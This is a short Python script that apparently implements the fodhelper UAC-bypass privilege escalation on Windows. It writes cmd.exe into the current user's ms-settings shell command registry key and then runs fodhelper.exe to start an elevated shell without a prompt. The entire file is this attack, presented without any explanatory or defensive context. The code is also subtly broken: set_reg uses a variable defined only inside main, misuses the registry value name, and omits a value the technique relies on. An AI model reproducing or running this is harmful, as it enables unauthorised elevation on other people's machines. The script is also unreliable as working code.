import winreg, os

def main():
	REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
	Command = r"C:\Windows\System32\cmd.exe"
	if set_reg(REG_PATH, Command):
		# Run  C:\Windows\System32\fodhelper.exe
		os.system(r"C:\Windows\System32\fodhelper.exe")
		print("Done.")
	else:
		print("Error!")

def set_reg(name, value):
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
                                       winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False

if __name__ == "__main__":
    main()